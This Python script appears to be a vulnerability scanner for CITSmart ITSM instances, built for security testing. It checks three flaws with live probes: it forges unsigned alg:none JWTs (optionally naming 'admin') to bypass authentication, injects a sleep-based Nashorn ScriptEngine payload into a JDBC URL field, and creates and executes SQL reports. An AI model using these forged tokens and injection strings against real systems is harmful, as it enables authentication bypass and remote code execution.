#!/usr/bin/env python3
"""
CITSmart Vulnerability Scanner
================================
Checks a CITSmart ITSM instance for known vulnerabilities.

Reports VULNERABLE / NOT VULNERABLE / UNKNOWN for each check.
Does NOT exploit — only verifies exploitability via safe probes.

Supports multiple authentication modes:
  - jwt:      Forge alg:none JWT (tests CRED-004 itself)
  - ldap:     Native CITSmart form-based login
  - token:    Pre-built session cookie
  - keycloak: Keycloak Resource Owner Password Grant
  - none:     No authentication (test unauthenticated checks only)

Requires: Python 3.6+, requests
Usage:    python3 citsmart_scanner.py --help
"""

import argparse
import base64
import json
import re
import sys
import time
import uuid

try:
    import requests
    from requests.exceptions import RequestException, Timeout
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] 'requests' library required: pip install requests")
    sys.exit(1)


# =============================================================================
# Colors
# =============================================================================

class C:
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    B = '\033[94m'
    M = '\033[95m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RST = '\033[0m'

def vuln(vid, msg):  print(f"  {C.R}[VULNERABLE]{C.RST}  {C.BOLD}{vid}{C.RST} — {msg}")
def safe(vid, msg):  print(f"  {C.G}[SAFE]{C.RST}        {C.BOLD}{vid}{C.RST} — {msg}")
def skp(vid, msg):   print(f"  {C.Y}[SKIP]{C.RST}        {C.BOLD}{vid}{C.RST} — {msg}")
def unkn(vid, msg):  print(f"  {C.Y}[UNKNOWN]{C.RST}     {C.BOLD}{vid}{C.RST} — {msg}")
def info(msg):       print(f"  {C.B}[*]{C.RST} {msg}")
def err(msg):        print(f"  {C.R}[!]{C.RST} {msg}")
def ok(msg):         print(f"  {C.G}[+]{C.RST} {msg}")
def head(msg):       print(f"\n{C.BOLD}{C.M}{'='*60}\n  {msg}\n{'='*60}{C.RST}")


# =============================================================================
# JWT Forging
# =============================================================================

def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def forge_jwt(issuer=None, username=None, subject=None, client_id=None,
              hyper_client=None, cluster_space=None) -> str:
    """Forge an unsigned JWT (alg:none)."""
    header = _b64url(json.dumps(
        {'alg': 'none', 'typ': 'JWT'}, separators=(',', ':')
    ).encode())
    claims = {
        'exp': 2061234567,
        'iat': int(time.time()),
        'typ': 'Bearer',
        'sid': f'scan-{uuid.uuid4().hex[:8]}',
        'acr': '1',
        'scope': 'email profile',
        'email_verified': False,
        'name': 'Scanner',
        'email': 'scanner@test.local',
    }
    if issuer:        claims['iss'] = issuer
    if subject:       claims['sub'] = subject
    else:             claims['sub'] = str(uuid.uuid4())
    if client_id:     claims['azp'] = client_id; claims['aud'] = 'account'
    if username:      claims['preferred_username'] = username
    if hyper_client:  claims['hyper_client'] = hyper_client
    if cluster_space: claims['hyper_cluster_space'] = cluster_space
    payload = _b64url(json.dumps(claims, separators=(',', ':')).encode())
    return f'{header}.{payload}.'


# =============================================================================
# Authentication
# =============================================================================

class Authenticator:
    """Handles all authentication modes."""

    def __init__(self, args):
        self.args = args
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'User-Agent': 'CITSmart-Scanner/1.0'})
        self.authenticated = False
        self.auth_method_used = None

    def authenticate(self) -> bool:
        a = self.args
        mode = a.auth_mode

        if mode == 'none':
            info("No authentication (unauthenticated checks only)")
            self.auth_method_used = 'none'
            return True

        if mode == 'token':
            if not a.token:
                err("--token required for auth-mode=token")
                return False
            self.session.cookies.set(a.cookie_name, a.token)
            self.auth_method_used = 'token'
            self.authenticated = True
            ok(f"Using pre-built token via cookie {a.cookie_name}")
            return True

        if mode == 'jwt':
            token = forge_jwt(
                issuer=a.jwt_issuer, username=a.jwt_username,
                subject=a.jwt_subject, client_id=a.jwt_client_id,
                hyper_client=a.jwt_hyper_client,
                cluster_space=a.jwt_cluster_space,
            )
            self.session.cookies.set(a.cookie_name, token)
            self.auth_method_used = 'jwt'
            self.authenticated = True
            ok(f"Forged alg:none JWT via cookie {a.cookie_name}")
            return True

        if mode == 'ldap':
            if not a.ldap_user or not a.ldap_pass:
                err("--ldap-user and --ldap-pass required for auth-mode=ldap")
                return False
            return self._ldap_login()

        if mode == 'keycloak':
            return self._keycloak_login()

        err(f"Unknown auth mode: {mode}")
        return False

    def _ldap_login(self):
        a = self.args
        target = a.target.rstrip('/')
        login_url = a.login_url or '/citsmart/webmvc/login'

        try:
            r = self.session.get(f"{target}{login_url}", timeout=15)
            if r.status_code != 200:
                err(f"Login page returned {r.status_code}")
                return False
        except RequestException as e:
            err(f"Cannot reach login page: {e}")
            return False

        csrf = re.findall(r'name="_csrf"[^>]*value="([^"]+)"', r.text)
        csrf_token = csrf[0] if csrf else ''

        login_username = f"{a.ldap_domain}\\{a.ldap_user}" if a.ldap_domain else a.ldap_user
        data = {'username': login_username, 'password': a.ldap_pass, '_csrf': csrf_token}

        try:
            r = self.session.post(f"{target}/citsmart/perform_login", data=data,
                                  timeout=15, allow_redirects=True)
        except RequestException as e:
            err(f"Login POST failed: {e}")
            return False

        if self.session.cookies.get('AUTH-TOKEN') or self.session.cookies.get(a.cookie_name):
            self.authenticated = True
            self.auth_method_used = 'ldap'
            ok(f"LDAP login OK (cookies: {list(self.session.cookies.keys())})")
            return True

        if 'experienceCenter' in r.url or 'index.load' in r.url:
            self.authenticated = True
            self.auth_method_used = 'ldap'
            ok("LDAP login OK (redirected to app)")
            return True

        err("LDAP login failed — no auth cookie received")
        return False

    def _keycloak_login(self):
        a = self.args
        if not all([a.keycloak_url, a.keycloak_realm, a.keycloak_client_id,
                     a.keycloak_user, a.keycloak_pass]):
            err("All --keycloak-* options required for auth-mode=keycloak")
            return False

        token_url = (f"{a.keycloak_url.rstrip('/')}/realms/{a.keycloak_realm}"
                     f"/protocol/openid-connect/token")
        data = {
            'client_id': a.keycloak_client_id, 'grant_type': 'password',
            'username': a.keycloak_user, 'password': a.keycloak_pass,
        }
        try:
            r = requests.post(token_url, data=data, timeout=15, verify=False)
            if r.status_code == 200:
                token = r.json().get('access_token')
                if token:
                    self.session.cookies.set(a.cookie_name, token)
                    self.authenticated = True
                    self.auth_method_used = 'keycloak'
                    ok(f"Keycloak token obtained (expires {r.json().get('expires_in', '?')}s)")
                    return True
            err(f"Keycloak returned {r.status_code}: {r.text[:200]}")
        except RequestException as e:
            err(f"Cannot reach Keycloak: {e}")
        return False


# =============================================================================
# Vulnerability Checks
# =============================================================================

EXTERNAL_CONN = "/citsmart/ExternalConnection.save"


def check_cred004(session, target, args):
    """CRED-004: JWT alg:none authentication bypass (parseUntrustedToken)."""
    cookie_name = args.cookie_name
    check_url = args.auth_check_url or '/citsmart/webmvc/v1/user/available'

    probe_urls = [
        check_url,
        '/citsmart/webmvc/login',
        '/citsmart/pages/smartDecisions/smartDecisions.load',
    ]

    def probe(cookies=None):
        s = requests.Session()
        s.verify = False
        if cookies:
            for k, v in cookies.items():
                s.cookies.set(k, v)
        for url in probe_urls:
            try:
                r = s.get(f"{target}{url}", timeout=10, allow_redirects=False)
                return r, url
            except RequestException:
                continue
        return None, None

    # Strategy 1: If we have a real token (keycloak/ldap/token mode),
    # compare real token vs forged token to see if the backend differentiates
    has_real_token = args.auth_mode in ('keycloak', 'token', 'ldap')

    if has_real_token:
        info("  Comparing real token vs forged alg:none token...")

        # Test with authenticated session (real token)
        try:
            r_real = session.get(f"{target}{check_url}", timeout=10, allow_redirects=False)
            real_sig = (r_real.status_code, len(r_real.content))
        except RequestException:
            return unkn("CRED-004", "Cannot reach target with real token")

        # Test with forged alg:none token
        fake_token = forge_jwt(
            issuer=args.jwt_issuer, username='scanner',
            subject=args.jwt_subject or str(uuid.uuid4()),
            client_id=args.jwt_client_id,
            hyper_client=args.jwt_hyper_client,
            cluster_space=args.jwt_cluster_space,
        )
        s_fake = requests.Session()
        s_fake.verify = False
        s_fake.cookies.set(cookie_name, fake_token)
        try:
            r_fake = s_fake.get(f"{target}{check_url}", timeout=10, allow_redirects=False)
            fake_sig = (r_fake.status_code, len(r_fake.content))
        except RequestException:
            return unkn("CRED-004", "Cannot reach target with forged token")

        details = f"real-token={real_sig[0]}/{real_sig[1]}B, forged={fake_sig[0]}/{fake_sig[1]}B"

        if r_fake.status_code == 200 and r_real.status_code == 200:
            # Both accepted — backend doesn't validate signatures
            return vuln("CRED-004",
                         f"Forged alg:none token ACCEPTED same as real token. {details}")

        if r_fake.status_code in (401, 403) and r_real.status_code == 200:
            return safe("CRED-004",
                         f"Forged token REJECTED, real token accepted. "
                         f"JWT validation is working. {details}")

        # Ambiguous: both rejected or both failed
        if r_fake.status_code == r_real.status_code:
            if r_real.status_code in (401, 403):
                return unkn("CRED-004",
                             f"Both tokens rejected ({r_real.status_code}). "
                             f"Endpoint may require additional auth. {details}")
            return unkn("CRED-004", f"Same response for both tokens. {details}")

        return unkn("CRED-004", f"Unexpected responses. {details}")

    # Strategy 2: Unauthenticated — compare no-token vs forged vs garbage
    info("  Sending probes: no-token, forged alg:none, garbage...")

    r_none, used_url = probe()
    if not r_none:
        return unkn("CRED-004", "Cannot reach target on any endpoint")
    if used_url != check_url:
        info(f"  Using fallback endpoint: {used_url}")

    fake_token = forge_jwt(
        issuer=args.jwt_issuer, username='scanner',
        subject=str(uuid.uuid4()),
        client_id=args.jwt_client_id,
        hyper_client=args.jwt_hyper_client,
        cluster_space=args.jwt_cluster_space,
    )
    r_fake, _ = probe({cookie_name: fake_token})
    if not r_fake:
        return unkn("CRED-004", "Cannot reach target with forged token")

    r_garb, _ = probe({cookie_name: 'AAAA-NOT-A-JWT-ZZZZ'})

    no_sig = (r_none.status_code, len(r_none.content))
    fake_sig = (r_fake.status_code, len(r_fake.content))
    garb_sig = (r_garb.status_code, len(r_garb.content)) if r_garb else (0, 0)

    details = (f"no-token={no_sig[0]}/{no_sig[1]}B, "
               f"forged={fake_sig[0]}/{fake_sig[1]}B, "
               f"garbage={garb_sig[0]}/{garb_sig[1]}B")

    if no_sig != fake_sig:
        if r_fake.status_code == 200:
            return vuln("CRED-004", f"JWT alg:none ACCEPTED (full bypass). {details}")
        return vuln("CRED-004",
                     f"JWT parsed without signature validation (behavioral diff). {details}")

    if r_garb and r_garb.status_code == 500 and r_fake.status_code != 500:
        return vuln("CRED-004",
                     f"JWT parser active (garbage=500, forged={r_fake.status_code}). {details}")

    return safe("CRED-004", f"No differential response detected. {details}")


def check_rce002(session, target, args):
    """RCE-002: ScriptEngine injection via ExternalConnection.save (time-based)."""
    baseline_data = {
        'urlJdbc': 'x', 'jdbcUser': 'x', 'jdbcPassword': 'x',
        'jdbcDriver': 'oracle', 'tipo': '1',
    }
    try:
        t0 = time.time()
        r_base = session.post(f"{target}{EXTERNAL_CONN}", data=baseline_data, timeout=15)
        base_time = time.time() - t0
    except RequestException as e:
        return unkn("RCE-002", f"Cannot reach endpoint: {e}")

    if r_base.status_code == 403:
        return skp("RCE-002", "Endpoint blocked by firewall (403)")
    if r_base.status_code == 404:
        return skp("RCE-002", "Endpoint not found (404)")
    if r_base.status_code == 302:
        loc = r_base.headers.get('Location', '')
        if 'login' in loc.lower():
            return skp("RCE-002", "Redirected to login (not authenticated)")

    # Time-based: inject Thread.sleep(3000)
    sleep_data = dict(baseline_data)
    sleep_data['urlJdbc'] = "x'); } java.lang.Thread.sleep(3000); function _f(){ var _=('"

    try:
        t0 = time.time()
        r_sleep = session.post(f"{target}{EXTERNAL_CONN}", data=sleep_data, timeout=30)
        elapsed = time.time() - t0
    except Timeout:
        elapsed = time.time() - t0
        if elapsed >= 2.5:
            return vuln("RCE-002", f"Timeout after {elapsed:.1f}s (sleep injected). RCE confirmed.")
        return unkn("RCE-002", f"Timed out ({elapsed:.1f}s)")
    except RequestException as e:
        return unkn("RCE-002", f"Request failed: {e}")

    details = (f"baseline={r_base.status_code}/{base_time:.2f}s, "
               f"sleep={r_sleep.status_code}/{elapsed:.2f}s, "
               f"delta={elapsed - base_time:.2f}s")

    if (elapsed - base_time) >= 2.5:
        return vuln("RCE-002", f"Thread.sleep(3s) caused {elapsed:.2f}s delay. RCE confirmed. {details}")

    return safe("RCE-002", f"No time delay detected. {details}")


def check_sqli005(session, target, args):
    """SQLI-005: Arbitrary SQL execution via Smart Reports."""

    # CITSmart has two API patterns depending on version:
    #   Hyper (1.9.x): /citsmart/webmvc/v1/smartReport (REST)
    #   Helium (2.x):  /citsmart/smartReports.load + .event (legacy Servlet)

    results = {}

    # --- Try REST API (Hyper) ---
    rest_url = f"{target}/citsmart/webmvc/v1/smartReport"
    try:
        r = session.get(rest_url, timeout=10, allow_redirects=False)
        results['rest_list'] = (r.status_code, len(r.content))
    except RequestException:
        results['rest_list'] = (0, 0)

    # --- Try legacy .load (Helium / all versions) ---
    load_url = f"{target}/citsmart/smartReports.load"
    try:
        r_load = session.get(load_url, timeout=10, allow_redirects=False)
        results['legacy_load'] = (r_load.status_code, len(r_load.content))
    except RequestException:
        results['legacy_load'] = (0, 0)

    # --- Try legacy .event actions ---
    event_url = f"{target}/citsmart/smartReportGenerator.event"
    try:
        r_event = session.post(event_url,
                               data={'method': 'carregaTabelaRelatorios', 'filterTabela': ''},
                               timeout=10, allow_redirects=False)
        results['legacy_event'] = (r_event.status_code, len(r_event.content))
    except RequestException:
        results['legacy_event'] = (0, 0)

    details = ', '.join(f"{k}={v[0]}/{v[1]}B" for k, v in results.items())

    # Check for auth issues first
    all_codes = [v[0] for v in results.values()]
    if all(c in (302, 401, 0) for c in all_codes):
        return skp("SQLI-005", f"Not authenticated or unreachable. {details}")
    if all(c in (403, 0) for c in all_codes):
        return skp("SQLI-005", f"All endpoints blocked (403). {details}")

    # Try to create a test report via REST API
    rest_status = results['rest_list'][0]
    if rest_status in (200, 201):
        test_id = uuid.uuid4().hex[:8]
        report_id = None
        try:
            r_create = session.post(rest_url, json={
                'title': f'__scan_{test_id}', 'type': 1,
                'sql': 'SELECT 1 AS scanner_test', 'module': 'smart_report',
            }, timeout=15)
            if r_create.status_code in (200, 201):
                body = {}
                try:
                    body = r_create.json()
                except Exception:
                    pass
                report_id = body.get('id') or body.get('payload', {}).get('id')
        except Exception:
            pass

        if report_id:
            exec_ok = False
            try:
                r_exec = session.get(f"{rest_url}/{report_id}/execute", timeout=15)
                exec_ok = r_exec.status_code == 200
            except Exception:
                pass
            try:
                session.delete(f"{rest_url}/{report_id}", timeout=10)
            except Exception:
                pass
            if exec_ok:
                return vuln("SQLI-005",
                             f"Created and executed SQL report via REST (id={report_id})")
            return vuln("SQLI-005",
                         f"Created SQL report via REST (id={report_id})")

    # Check legacy .event with actual data returned
    ev_status, ev_size = results['legacy_event']
    if ev_status == 200 and ev_size > 0:
        return vuln("SQLI-005",
                     f"Smart Report Generator .event accessible and returning data. {details}")

    # If .load page is accessible but .event returns empty, might be partially mitigated
    load_status, load_size = results['legacy_load']
    if load_status == 200 and load_size > 1000:
        if ev_status == 200 and ev_size == 0:
            return unkn("SQLI-005",
                         f"Report page accessible but .event actions return empty. "
                         f"Possibly mitigated. {details}")
        return unkn("SQLI-005",
                     f"Report page accessible ({load_size}B). "
                     f"Manual testing recommended. {details}")

    return safe("SQLI-005", f"Smart Report endpoints not exploitable. {details}")


# =============================================================================
# Main
# =============================================================================

# (id, description, check_function, requires_auth)
ALL_CHECKS = [
    ('CRED-004', 'JWT alg:none Authentication Bypass',       check_cred004, None),  # auto
    ('RCE-002',  'Nashorn ScriptEngine Injection',           check_rce002,  True),
    ('SQLI-005', 'Smart Report Arbitrary SQL Execution',     check_sqli005, True),
]

CHECK_MAP = {c[0]: c for c in ALL_CHECKS}


def build_parser():
    p = argparse.ArgumentParser(
        description='CITSmart Vulnerability Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:

  # 1. No authentication — tests CRED-004 only
  python3 citsmart_scanner.py \\
    -t https://itsm.example.com \\
    --auth-mode none

  # 2. JWT alg:none bypass (Keycloak-backed instances)
  #    Tests all 3 vulns using a forged unsigned JWT
  python3 citsmart_scanner.py \\
    -t https://itsm.example.com \\
    --auth-mode jwt \\
    --cookie-name HYPER-AUTH-TOKEN \\
    --jwt-issuer https://keycloak.example.com/realms/myrealm \\
    --jwt-username admin \\
    --jwt-subject "a1b2c3d4-e5f6-7890-abcd-ef1234567890" \\
    --jwt-client-id front-manager \\
    --jwt-hyper-client "11111111-2222-3333-4444-555555555555" \\
    --jwt-cluster-space "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"

  # 3. Keycloak ROPC — authenticates with real credentials
  python3 citsmart_scanner.py \\
    -t https://itsm.example.com \\
    --auth-mode keycloak \\
    --cookie-name HYPER-AUTH-TOKEN \\
    --keycloak-url https://keycloak.example.com \\
    --keycloak-realm myrealm \\
    --keycloak-client-id front-manager \\
    --keycloak-user johndoe \\
    --keycloak-pass "S3cur3P@ss"

  # 4. LDAP login (native CITSmart form-based auth)
  python3 citsmart_scanner.py \\
    -t https://itsm.example.com \\
    --auth-mode ldap \\
    --cookie-name AUTH-TOKEN \\
    --ldap-user johndoe \\
    --ldap-pass "S3cur3P@ss" \\
    --ldap-domain citsmart.local \\
    --auth-check-url /citsmart/rest/citajax/experienceCenter/getUserLogged

  # 5. Pre-built session token (any cookie you already have)
  python3 citsmart_scanner.py \\
    -t https://itsm.example.com \\
    --auth-mode token \\
    --cookie-name HYPER-AUTH-TOKEN \\
    --token "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
""")

    g = p.add_argument_group('Target')
    g.add_argument('-t', '--target', required=True, help='Target CITSmart URL')

    g = p.add_argument_group('Authentication')
    g.add_argument('--auth-mode', choices=['jwt', 'ldap', 'token', 'keycloak', 'none'],
                   default='none', help='Authentication method (default: none)')
    g.add_argument('--token', help='Pre-built session token')
    g.add_argument('--cookie-name', default='HYPER-AUTH-TOKEN',
                   help='Auth cookie name (default: HYPER-AUTH-TOKEN)')
    g.add_argument('--auth-check-url', default='/citsmart/webmvc/v1/user/available',
                   help='Endpoint to verify auth')

    g = p.add_argument_group('LDAP Login')
    g.add_argument('--ldap-user', help='LDAP username')
    g.add_argument('--ldap-pass', help='LDAP password')
    g.add_argument('--ldap-domain', default='citsmart.local', help='LDAP domain')
    g.add_argument('--login-url', help='Login page URL (default: /citsmart/webmvc/login)')

    g = p.add_argument_group('JWT Forging (auth-mode=jwt)')
    g.add_argument('--jwt-issuer', help='JWT "iss" claim')
    g.add_argument('--jwt-username', help='JWT "preferred_username" claim')
    g.add_argument('--jwt-subject', help='JWT "sub" claim (UUID)')
    g.add_argument('--jwt-client-id', help='JWT "azp" claim')
    g.add_argument('--jwt-hyper-client', help='JWT "hyper_client" claim')
    g.add_argument('--jwt-cluster-space', help='JWT "hyper_cluster_space" claim')

    g = p.add_argument_group('Keycloak (auth-mode=keycloak)')
    g.add_argument('--keycloak-url', help='Keycloak base URL')
    g.add_argument('--keycloak-realm', help='Keycloak realm')
    g.add_argument('--keycloak-client-id', help='Keycloak client ID')
    g.add_argument('--keycloak-user', help='Keycloak username')
    g.add_argument('--keycloak-pass', help='Keycloak password')

    g = p.add_argument_group('Scan Options')
    g.add_argument('--checks', nargs='+', metavar='ID',
                   help=f"Run only specific checks. Available: {', '.join(c[0] for c in ALL_CHECKS)}")

    return p


def main():
    parser = build_parser()
    args = parser.parse_args()
    target = args.target.rstrip('/')

    print(f"""
{C.BOLD}{C.M}+{'='*58}+
|{'CITSmart Vulnerability Scanner':^58}|
+{'='*58}+{C.RST}
  Target:  {target}
  Auth:    {args.auth_mode}
""")

    # Determine checks
    if args.checks:
        check_ids = [c.upper() for c in args.checks]
        for c in check_ids:
            if c not in CHECK_MAP:
                err(f"Unknown check: {c}. Available: {', '.join(CHECK_MAP.keys())}")
                sys.exit(1)
        checks = [CHECK_MAP[c] for c in check_ids]
    else:
        checks = list(ALL_CHECKS)

    # Authenticate
    auth = Authenticator(args)
    has_auth_checks = any(c[3] for c in checks)

    if args.auth_mode != 'none':
        head("Authentication")
        if not auth.authenticate() and has_auth_checks:
            err("Authentication failed. Authenticated checks will be skipped.")

    # Split checks: None = runs always, False = no auth needed, True = auth needed
    always = [c for c in checks if c[3] is None]
    unauth = [c for c in checks if c[3] is False]
    authed = [c for c in checks if c[3] is True]

    head("Vulnerability Checks")

    for cid, desc, func, _ in always:
        info(f"Testing {cid}: {desc}")
        func(auth.session, target, args)
        print()

    for cid, desc, func, _ in unauth:
        info(f"Testing {cid}: {desc}")
        func(auth.session, target, args)
        print()

    if authed:
        if not auth.authenticated and args.auth_mode == 'none':
            for cid, desc, _, _ in authed:
                skp(cid, f"{desc} — requires authentication (use --auth-mode)")
        elif not auth.authenticated:
            for cid, desc, _, _ in authed:
                skp(cid, f"{desc} — authentication failed")
        else:
            for cid, desc, func, _ in authed:
                info(f"Testing {cid}: {desc}")
                func(auth.session, target, args)
                print()

    head("Scan Complete")
    info(f"Target: {target}")
    info(f"Auth: {auth.auth_method_used or 'none'}")
    info(f"Checks: {len(checks)}")
    print()


if __name__ == '__main__':
    main()
